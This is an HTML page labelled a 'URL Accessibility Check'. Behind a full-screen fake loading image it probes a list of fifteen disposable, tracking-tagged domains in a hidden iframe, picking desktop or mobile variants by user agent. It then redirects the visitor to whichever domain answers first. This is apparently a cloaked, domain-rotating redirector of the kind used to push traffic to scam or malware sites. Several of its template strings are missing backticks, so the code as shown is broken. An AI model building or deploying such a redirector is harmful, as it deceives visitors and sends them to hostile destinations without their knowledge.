<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL Accessibility Check</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden; 
        }
        #loadingImage {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%; 
            height: 100%;
            object-fit: cover; 
            z-index: 999; 
        }
        #testFrame {
            display: none; 
        }
    </style>
</head>
<body>

    <img id="loadingImage" src="start_page.png" alt="Loading...">

    <iframe id="testFrame"></iframe>

    <script>
        const urlsDesktop = [
            "https://q9r0s1.click?f=4556781", "https://r0s1t2.icu?f=4556781", "https://r2s3t4.buzz?f=4556781", 
            "https://r4s5t6.fun?f=4556781", "https://r6s7t8.click?f=4556781", "https://t8u9v0.buzz?f=4556781",
            "https://u3v4w5.icu?f=4556781", "https://u5v6w7.buzz?f=4556781", "https://u7v8w9.fun?f=4556781",
            "https://u9v0w1.click?f=4556781", "https://v4w5x6.buzz?f=4556781", "https://w1x2y3.buzz?f=4556781",
            "https://w3x4y5.fun?f=4556781", "https://w5x6y7.click?f=4556781", "https://w9x0y1.xyz?f=4556781"
        ];
        
        const urlsMobile = [
            "https://m.q9r0s1.click?f=4556781", "https://m.r0s1t2.icu?f=4556781", "https://m.r2s3t4.buzz?f=4556781",
            "https://m.r4s5t6.fun?f=4556781", "https://m.r6s7t8.click?f=4556781", "https://m.t8u9v0.buzz?f=4556781",
            "https://m.u3v4w5.icu?f=4556781", "https://m.u5v6w7.buzz?f=4556781", "https://m.u7v8w9.fun?f=4556781",
            "https://m.u9v0w1.click?f=4556781", "https://m.v4w5x6.buzz?f=4556781", "https://m.w1x2y3.buzz?f=4556781",
            "https://m.w3x4y5.fun?f=4556781", "https://m.w5x6y7.click?f=4556781", "https://m.w9x0y1.xyz?f=4556781"
        ];

        const testFrame = document.getElementById('testFrame');
        const loadingImage = document.getElementById('loadingImage');
        const timeoutDuration = 5000;

        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        const urls = isMobile ? urlsMobile : urlsDesktop;
        let checkedUrls = new Set();

        function checkRandomUrl() {
            if (checkedUrls.size === urls.length) {
                loadingImage.style.display = 'none';
                console.log('No accessible URLs found.');
                return;
            }

            let randomIndex;
            do {
                randomIndex = Math.floor(Math.random() * urls.length);
            } while (checkedUrls.has(randomIndex));

            const url = urls[randomIndex];
            checkedUrls.add(randomIndex);

            console.log(Checking: ${url});

            let loadTimeout = setTimeout(() => {
                console.error(Timeout loading ${url});
                checkRandomUrl();
            }, timeoutDuration);

            testFrame.onload = function() {
                clearTimeout(loadTimeout); 
                loadingImage.style.display = 'none';
                window.location.href = url;
            };

            testFrame.onerror = function() {
                clearTimeout(loadTimeout);
                console.error(Failed to load ${url});
                checkRandomUrl();
            };

            testFrame.src = url;    
        }

        checkRandomUrl();
    </script>

</body>
</html>
